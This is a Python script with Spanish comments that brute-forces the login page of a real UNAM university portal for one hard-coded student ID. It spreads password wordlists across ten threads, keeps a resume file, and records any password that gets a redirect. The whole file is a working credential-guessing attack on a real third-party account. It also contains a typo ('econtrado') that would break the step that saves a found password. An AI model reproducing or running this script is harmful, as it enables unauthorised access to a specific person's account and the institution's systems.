#!/usr/bin/python
import sys
import requests
import threading

def martillo(nombre):#esta es la funcion donde se hace el proceso
	flag = False #bandera necesario
	diccionario = open(nombre,"r") #se abre el diccionario para solo lectura
	memoryFinal = open("sav"+nombre,"r+") #se abre el buffer que guarda la ultima contraseña probada
	direccion = memoryFinal.readline().strip("\n") #se guarda en la direccion donde esta la ultima contraseña probada
	print(direccion)
	if(direccion==""):
		direccion=diccionario.readline().strip("\n")
		diccionario.seek(0)
	encontrado = open("encontrado.txt","r+")
	if encontrado.read() =='':
		print(direccion)
		encontrado=open("encontrado.txt","r+")
		for palabra in diccionario.readlines(): #iteracion que recorre el diccionario
			if encontrado.read()!='':
				print("ya hay algo\n"+str(encontrado.read()))
			palabra = palabra.strip("\n")
			if flag==False:
				print(direccion+" "+palabra)
				if direccion == palabra.strip("\n"): #se comprueba la igualdad con la direccion
					flag = True
			if flag == True:
				data ={ #son los datos de acceso para el usuario y contraseña
					'usr':'314144799',
					'pass':palabra.strip("\n")	
				}
				r = requests.post("http://aragon.dgae.unam.mx/php/almn/login.php", data=data, allow_redirects=False) #envio de metodo post
				if r.status_code in [300,301,302]: #si regresa estos codigos http significa que cambio de pagina y hay contraseña correcta
					print("{0} es valida".format(palabra))
					print(r.status_code)
					encontrado.write("314144799\n")
					econtrado.write(palabra) #se guarda la contraseña encontrada
					encontrado.close()
					break #se acaba la iteracion
				else:
					print("contraseña {0} no valida".format(palabra))
					print(r.status_code) #se imprime el estatus que regresa la pagina normalmente es 200
					memoryFinal.seek(0) #se regresa a la primera posicion de archivo para sobrescribir
					memoryFinal.write(palabra) #se escribe la contraseña usada
		memoryFinal.close() #se cierra el archivo de persistencia
	else:
		print(encontrado.read())
		encontrado.close()

def main(): #funcion main que da inicio a todo
	for i in range(10): #10 iteraciones
		hilo = threading.Thread(target=martillo, args=("contras"+str(i)+".txt",)) #se crea un hilo pasando argumentos 
		hilo.start() #se inicia el hilo

main() #se inicia todo